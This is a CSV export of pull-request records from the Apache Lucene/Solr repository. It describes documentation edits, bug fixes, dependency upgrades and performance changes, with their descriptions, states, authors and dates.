"#","No","Issue Title","Issue Details","State","Labels","User name","created","Updated"
"","2275","SOLR-15123: Make all Tool option descriptions follow the same general pattern.","# Description different people have written different SolrCLI tools over time, and it shows in the user help.   # Solution Copy edit all the tool options.  # Tests  Just docs.   In fact, it appears tools don't have tests.  ;-(","closed","","epugh","2021-01-29T23:01:31Z","2021-02-05T20:17:59Z"
"","1923","SOLR-14900: Reference Guide build cleanup/module upgrade","# Description buildSite task was generating some scary warnings on first build as it was getting various gems as well as a warning on each build. It was version locked before due to ant and PDF, but that's no longer part of Solr 9.  # Solution Upgraded all explicit versions to the latest available. Everything seems to build the same, the only changes were for the source block styles. We were supposed to be using thankful-eyes theme but the correct name of that theme is actually thankful_eyes and it is a dark theme, so we were falling back to 'github' theme. Made that more clear and explicit. Switched to using stylesheets as well instead of embedded styles, as upgrade module was generating more markup for better dark-themes support (I guess).  There is still an old warning during build about _Illegal reflective access_ and a new one about _Improper use of Lexer#lex_ . It may be worth repeating the upgrade process in another couple of months to see if that had been fixed in relevant libraries.  # Tests There were no code changes, but I visually and 'diff' checked the old and new html output.  # Checklist  Please review the following and check all that apply:  - [X I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [X] I have created a Jira issue and added the issue ID to my pull request title. - [X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [X] I have developed this patch against the `master` branch. - [X] I have run `./gradlew check`.","open","","arafalov","2020-09-27T15:24:33Z","2020-10-09T18:44:51Z"
"","1960","SOLR-14659: Remove restlet as dependency for the ManagedResource API (backport to 8.x)","# Description Backport of e879a52291ef7dcd0514e7419d811b6ff800bcce to remove restlet as a dependency.  # Solution  Please provide a short description of the approach taken to implement your solution.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","thelabdude","2020-10-07T20:04:15Z","2020-10-07T20:17:37Z"
"","1978","LUCENE-9524: Fix NPE in SpanWeight#explain when no scoring is require…","# Description `SpanWeight#explain` uses `Similarity.SimScorer` to generate explanations, and may fail with NullPointerException when scoring is not needed and thus `Similarity.SimScorer` is set to null, such as matching for must not occur span query.  # Solution The solution is to check for null `Similarity.SimScorer` in `SpanWeight#explain`, and provides alternative explanation.  # Tests Added 1 integration test to `TestMemoryIndex` that was broken before the fix.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","zacharymorn","2020-10-13T04:56:52Z","2020-10-16T17:20:51Z"
"","2012","SOLR-14935: Solr can forward request ( remoteQuery ) even if there are local cores present","# Description  When querying using SolrJ today this is what happens -  - CloudSolrClient creates a list of all replicas from the alias ( after resolving it ) and then shuffles the list picking one Solr node to query against - When Solr receives the request, it only looks at the first collection from the alias and tries to find a local core - Anytime that isn't the case, it makes a remoteQuery ,  proxying the request to machineX which has a local core of the first collection from the alias.  # Solution  The solution involves trying to find a local core by looking at all the collections in the list and not just the first collection. this is a cheap operation and saves the overhead of an extra network hop  # Tests   # Performance  I was lucky enough to have a cluster which had exact production characteristics but was in dark mode. So we were able to test this change out internally and check out it's effectiveness   After a rolling restart of the cluster we saw the CPU idle percentage increase by roughly 10%  ![image](https://user-images.githubusercontent.com/158041/96658582-ba7f6580-12f9-11eb-9c42-a88356d10e36.png)   This improved the end to end latency as well. The graph purposely doesn't have the Y axis but it's a stack graph that buckets latency ( for example what % queries fall bellow 100ms etc ) . So the base green and yellow lines increasing means we are able to serve queries faster.  ![image](https://user-images.githubusercontent.com/158041/96658338-172e5080-12f9-11eb-9a74-e7a547972248.png)  I don't expect the latency improvements to be this drastic for everyone. In our specific case we had 2 things that really improved with this change  1. We have ~15 collections in an alias. So there was only a 14/15 times the query would end up being a remote query for searches 2. These remoteQueries were going through PKI authentication and not BasicAuth ( we use `forwardCredentals=true` ) . In our flame graphs we had seen this take a significant percentage of wall clock time ( 30% ) .  ![image](https://user-images.githubusercontent.com/158041/96658881-89ebfb80-12fa-11eb-916d-64171b581c61.png)  When we made the change to use `forwardCredentals=true` we saw this reduce to  ![image](https://user-images.githubusercontent.com/158041/96658948-ad16ab00-12fa-11eb-9612-864db2bf715b.png)   It is when we saw PKIAuth still show up in the flemagraph that we noticed `remoteQuery` being the reason  After the rollout of this PR this PKI isn't visible in the flamegraph at all 🎉   ![image](https://user-images.githubusercontent.com/158041/96659068-e94a0b80-12fa-11eb-9272-30aa2246d143.png)  # Checklist  Please review the following and check all that apply:  - [ ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ ] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","vthacker","2020-10-21T00:39:54Z","2021-11-19T00:45:30Z"
"","2118","SOLR-15031: Prevent null being wrapped in a QueryValueSource","# Description  When parsing a sub query in a function query, FunctionQParser#parseValueSource does not check if the produced query object is null. When it is, it just wraps a null in a QueryValueSource object. This is a cause for NPE's in code consuming that object. Parsed queries can be null, for example when the query string only contains stopwords, so we need handle that condition.  # Solution  Added a null check to FunctionQParser#parseValueSource  # Tests  The problem can be reproduced via: 1. Start solr with the techproducts example collection: solr start -e techproducts 2. Add a stopword to SOLR_DIR/example/techproducts/solr/techproducts/conf/stopwords.txt, for example ""at"" 3. Execute a function query: http://localhost:8983/solr/techproducts/select?fieldquery={!field%20f=features%20v=%27%22at%22%27}&q={!func}%20if($fieldquery,1,0)  After applying this PR the NPE is gone.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","vonbox","2020-12-04T09:58:36Z","2021-03-03T10:57:31Z"
"","1897","SOLR-9607: Finalize move of Terms component and request handler into the implicit definitions","# Description  We moved Terms Components and Terms Request Handler into default definition, but the request handler did not define any defaults. Therefore, we still had an overriding definition hanging around in solrconfig.xml, confusing things. Additionally, documentation was out of date too.  # Solution  1. Updated default definition for /terms request handler to match what solrconfig.xml had (terms=true to actually make that handler useful and distrib=false) 2. Removed definition from default configsets 3. Cleaned up tests that no longer needed to enable the component every time 4. Updated documentation to reflect the implicit aspects and to give an example of using it with other handlers  # Tests 1. No new tests, but updated the existing ones to rely on updated definition and not to declare it explicitly.  # Checklist  Please review the following and check all that apply:  - [X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [X] I have created a Jira issue and added the issue ID to my pull request title. - [X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [X] I have developed this patch against the `master` branch. - [X] I have run `./gradlew check`. - [X] I have added (updated) tests for my changes. - [X] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","arafalov","2020-09-20T18:35:23Z","2020-09-21T13:05:37Z"
"","2311","SOLR-15141: Remove V2RequestSupport SolrJ interface","# Description  V2RequestSupport was intended to allow support for v2 requests in SolrJ, but was never really adopted on a critical mass of SolrRequest implementations.  Now that the v2 API has had more time to mature, there are better approaches for supporting v2 APIs in SolrJ.  # Solution  Removes V2RequestSupport interface from SolrJ.  # Tests  N/A  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","gerlowskija","2021-02-07T03:35:11Z","2021-05-03T18:07:12Z"
"","2312","SOLR-15141: Deprecate V2RequestSupport","# Description  V2RequestSupport was intended to allow support for V2 requests in SolrJ, but never gained a critical mass of SolrRequest implementations.  Now that the V2 API is more mature there are better ways to support v2 requests in the API.  # Solution  Deprecate V2RequestSupport for subsequent removal in 9.0  # Tests  N/A  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have run `./gradlew check`. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","gerlowskija","2021-02-07T03:37:52Z","2021-02-23T01:40:52Z"
"","2008","SOLR-14951: Upgrade Angular JS 1.7.9 to 1.8.0","# Description  Upgrade Angular JS 1.7.9 to 1.8.0","closed","","risdenk","2020-10-20T00:42:36Z","2020-12-22T17:20:40Z"
"","1999","SOLR-14943 Rework Monitoring Solr with Prometheus and Grafana ref guide to be clearer","# Description  Update the ref guide based on going through the documentation and setting it up for the first time myself.  # Solution  Some fixes to example code, some transitions for folks like myself who don't know about these tools already!","closed","","epugh","2020-10-17T13:40:59Z","2020-10-20T01:50:08Z"
"","2146","SOLR-15049: Add TopLevelJoinQuery optimization for 'self-joins'","# Description  TopLevelJoinQuery currently converts ordinals of the ""from"" field into ordinals of the ""to"" field, even when the ""from"" and ""to"" field are the same and have the same ordinals.  By handling this special case we can greatly improve search performance for this subset of joins.  # Solution  This commit adds a new subclass ""TopLevelJoinQuery.SelfJoin"", which skips the ordinal-conversion step in typical ""top-level"" joins.   # Tests  Manual testing, along with beasting of TestJoin.java.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","gerlowskija","2020-12-15T02:31:02Z","2020-12-22T13:32:53Z"
"","2096","SOLR-15015: added support to parametric Interleaving algorithm","# Description  This pull requests add a parameter 'interleavingAlgorithm' in Learning To Rank to specify the Interleaving algorithm to use (Only TeamDraft supported) # Solution  Added the parameter and defaults  # Tests  Added a new test class for the  LTR QueryParser, related with interleaving parameters # Checklist  Please review the following and check all that apply:  - [X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [X] I have created a Jira issue and added the issue ID to my pull request title. - [X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [X] I have developed this patch against the `master` branch. - [X] I have run `./gradlew check`. - [X] I have added tests for my changes. - [X] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","alessandrobenedetti","2020-11-23T19:03:04Z","2020-11-24T10:11:23Z"
"","2227","SOLR-13105 - Visual Guide to Math Expressions","# Description  This PR supersedes #2211 and should provide a cleaner merge of the original `visual-guide` branch and my later copy edits.","closed","","ctargett","2021-01-20T18:51:43Z","2021-01-20T22:14:02Z"
"","2250","SOLR-13608: Incremental backup file format","# Description  This PR introduces a new way for Solr to do backups (with a new underlying file structure).  This new ""incremental"" backup process improves over the existing backup mechanism in several ways:  - multiple backups ""points"" can now be stored at a given backup   location/name, allowing users to choose which point in time they want   to restore - subsequent backups skip over uploading files that were uploaded by   previous backups, saving time and network time. - files are checksummed as they're uploaded, ensuring that corrupted   indices aren't persisted and accidentally restored later.  This PR is the first piece of SIP-12 - see the proposal for more context.  # Tests  Manual testing.  New unit tests.  New ""integration"" tests in HdfsCloudIncrementalBackupTest, LocalFSCloudIncrementalBackupTest, and HdfsBackupRepositoryIntegrationTest.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","gerlowskija","2021-01-26T18:40:52Z","2021-02-22T21:01:14Z"
"","2114","SOLR-12182: Don't persist base_url in ZK as the scheme is variable, compute from node_name instead ~ Backport to 8x","# Description  This is the backport to 8x from master, original PR was #2010  See JIRA for description of the issue: https://issues.apache.org/jira/browse/SOLR-12182  # Solution  This PR computes the `base_url` for a Replica using the stored `node_name` and a global `urlScheme` rather than storing the `base_url` in `state.json`. This avoids storing an incorrect URL scheme for replicas in persistent storage. The `base_url` is computed when read back from ZK and dropped when marshaling the Replica state to JSON. This also means we don't need a migration tool as stored state is ""healed"" on-the-fly when read back from ZK.  The unfortunate aspect of this PR is we need to keep the URL scheme for the cluster in a global variable (so that it is available when reading from ZK). The global `urlScheme` still comes from the cluster property but is then stored in a global singleton, see: `org.apache.solr.common.cloud.UrlScheme`. Alternatively, we could just keep the `urlScheme` in a static in ZkStateReader, I felt the global singleton `UrlScheme.INSTANCE` made it clearer that this was a global thing but it also made more sense with my first implementation that tried to make rolling restart upgrades to TLS less chaotic. It's a trivial change to move all this over to ZkStateReader and remove UrlScheme.  I initially tried setting a `ThreadLocal` that gives access to the `urlScheme` whenever we need to read these props from ZK. However, that ended up being problematic because we tend to read ZkNodeProps from ZK in many places. In reality, the `urlScheme` really is an immutable global variable that should be set once during initialization by reading from the cluster property stored in ZK. So I felt trying to treat this global as something that was highly dynamic made the code overly cumbersome. Put simply, we shouldn't support `urlScheme` changing in a live node after initialization, it's bad for business.  I also tried to get rid of the `urlScheme` cluster property (re: https://issues.apache.org/jira/browse/SOLR-10202) but I'm not sure how SolrCloud client applications can resolve the correct `urlScheme` for the cluster without this property? On the server-side, sure we can just get the `urlScheme` from a Java System Property, but that won't be set for remote client applications that initialize via a connection to ZooKeeper. So I'm keeping the cluster property `urlScheme` for now.  We also need to consider how to enable TLS on an existing cluster (with active collections) using a rolling restart process. The current `org.apache.solr.cloud.SSLMigrationTest` just stopped all test nodes at once and then brought them back with TLS enabled.  Based on feedback, I've since removed the option to pull the active urlScheme from live nodes as we're not able to ensure zero-downtime when moving from `http` -> `https` for clusters with existing collections and live traffic. Put simply, the feature was a bit trappy in that it tried to reduce chaos when doing a rolling restart to enable TLS, but it made no guarantees. Thus, users just need to be sure to enable TLS before building production clusters!  Lastly, I've tried to clean-up some of the places that access the baseUrl on replicas to be more consistent, so you'll see some of that in this PR as well.  # Tests  Many existing tests cover regression caused by these code changes. Added simple unit test for UrlScheme.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","thelabdude","2020-12-02T16:40:30Z","2020-12-02T18:00:31Z"
"","2557","LUCENE-10059: Fix AssertionError in JapaneseTokenizer backtrace","# Description  This is a backport of https://github.com/apache/lucene/pull/254  There is an issue which causes an `AssertionError` in the backtrace step of `JapaneseTokenizer`. If there is a text span of length 1024 (determined by `MAX_BACKTRACE_GAP`) where the regular backtrace is not called, a forced backtrace will be applied. If the partially best path at this point happens to end at the last pos, and since there is always a final backtrace applied at the end, the final backtrace will try to backtrace from and to the same position, causing an AssertionError in `RollingCharBuffer.get()` when it tries to generate an empty buffer.","closed","","dungba88","2021-08-20T14:47:47Z","2021-08-23T12:19:43Z"
"","1989","SOLR-14549 - Fix listing of Files in a Directory on Solr Admin UI","# Description  This fixes the listing of Files in a directory in the Solr Admin UI  # Solution  * Ensure that jstree can update data behind the scenes * Fix file jstree object to represent open/closed correctly * Upgrade jstree to 3.3.10 for compatibility with JQuery 3.5.x  # Tests  * Manually built Solr and checked that reported issue is no longer visible. * `./gradlew check -x test`  # Checklist  Please review the following and check all that apply:  - [X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [X] I have created a Jira issue and added the issue ID to my pull request title. - [X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [X] I have developed this patch against the `master` branch. - [X] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","risdenk","2020-10-15T20:22:59Z","2020-10-19T13:42:27Z"
"","1687","SOLR-14658: Fix colstatus solrj interfaces to return one or all collections","# Description  This fixes a bug in the solrj interface for the [COLSTATUS collection api](https://lucene.apache.org/solr/guide/8_6/collection-management.html#colstatus) as detailed in the [JIRA](https://issues.apache.org/jira/browse/SOLR-14658) such that using the class CollectionAdminRequest.collectionStatus(collectionName) to issue colstatus commands would return all collections vs just the one specified. This is an issue as the operation sends a request to all collections' shard leaders.   # Solution  CollectionAdminRequest.collectionStatus(collectionName) will now only return one collection. To support getting the status for all collections, I've added CollectionAdminRequest.collectionStatuses(). The documented API still works exactly as it is detailed.  # Tests  I've added a new test case to test these new interfaces. I've also provided a snippet of code and steps for manual validation in the JIRA (to repro the bug) but i can be used to test the fix as well: ```     String host = ""http://localhost:8983/solr"";     HttpSolrClient.Builder builder = new HttpSolrClient.Builder(host);     HttpSolrClient solrClient = builder.build();      String collection = ""tes"";     final NamedList response =        //solrClient.request(CollectionAdminRequest.collectionStatus(collection));       solrClient.request(CollectionAdminRequest.collectionStatuses());       response._forEachEntry((k,v) -> {         System.out.println(k);       });     System.out.println(response); ``` Using just the API and not solrj for verification: - http://localhost:8983/solr/admin/collections?action=COLSTATUS&collection=tester1   - return one collection - http://localhost:8983/solr/admin/collections?action=COLSTATUS   - return all collections  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `ant precommit` and the appropriate test suite. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","andyvuong","2020-07-22T18:50:50Z","2020-09-03T18:25:37Z"
"","1681","SOLR-10804: Allow same version updates in DocBasedVersionConstraintsProcessor","# Description  This change adds an optional configuration parameter to the `DocBasedVersionConstraintsProcessorFactory` which will allow updates to proceed if they have the same version as the existing document.  # Solution  1. Added a boolean parameter named `rejectSameVersion` which defaults to true. This is the original behaviour. 2. Based on the parameter the `DocBasedVersionConstraintsProcessor` will choose the correct strategy for comparing the versions in the new and existing documents. 3. The decision of which strategy to use is done up front so as to not check on every document update.  I chose the name `rejectSameVersion` because it seemed to fit with the documentation better as it talks more about rejecting updates than accepting them. Happy to to adjust this based on your feedback.  Edit: I realized i made an error by removing the protected method; so I've updated the PR to include it back in again. 👀   # Tests  Added a test to check that setting `rejectSameVersion` to `false` has the following behaviour: - Cannot update the document with an older version - Can update document with the same version - Can update document with a new version  All previous unit tests which rely on the default value of `true` pass.  # Checklist  Please review the following and check all that apply:  - [✅] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [✅] I have created a Jira issue and added the issue ID to my pull request title. - [✅] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [✅] I have developed this patch against the `master` branch. - [✅] I have run `ant precommit` and the appropriate test suite. - [✅] I have added tests for my changes. - [✅] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","squirmy","2020-07-20T08:08:12Z","2020-08-07T04:02:20Z"
"","1988","SOLR-14483","# Description  This builds on the work started in PR #1985   # Solution  Update to the CSS and JS to fix functionality.  # Tests  Manually tested.  # Checklist  Please review the following and check all that apply:  - [X ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ X] I have created a Jira issue and added the issue ID to my pull request title. - [X ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ X] I have developed this patch against the `master` branch. - [ X] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","hacktoberfest-accepted,","epugh","2020-10-15T18:08:16Z","2020-10-20T01:50:11Z"
"","2304","SOLR-15133: Document how to eliminate Failed to reserve shared memory warning","# Description  The warning is annoying if you know what it is, and alarming if you don't!    # Solution  Add to the Docker FAQ how to disable it.    Eventually this might feed the Ref Guide!  # Tests  Doc only  # Checklist  Please review the following and check all that apply:  - [X ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [X ] I have created a Jira issue and added the issue ID to my pull request title. - [X ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [X ] I have developed this patch against the `master` branch. - [X ] I have run `./gradlew check`. - [X ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","epugh","2021-02-04T16:17:04Z","2021-02-04T21:15:44Z"
"","1947","SOLR-14887 Upgrade JQuery to 3.5.1","# Description  The Solr admin UI currently uses JQuery 3.4.1 (SOLR-14209). JQuery 3.5.1 is out and addresses some security vulnerabilities. It would be good to upgrade.  # Solution  Upgraded JQuery to 3.5.1  # Tests  Manually tested the UI.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","gezapeti","2020-10-05T13:55:52Z","2020-10-13T23:41:57Z"
"","2137","SOLR-14251 Add option skipFreeSpaceCheck to skip checking for availble disk space before splitting shards. Useful with shared file systems like HDFS","# Description  The Shard split operation is checking available disk space on local disks of the host Solr is running on even if the index is on a shared storage (e.g. HDFS).   # Solution  I'm adding option skipFreeSpaceCheck as a workaround so shards can be split until there is a proper solution implemented.  # Tests  Tested only manually.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ x I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","gezapeti","2020-12-09T21:33:00Z","2020-12-15T14:59:47Z"
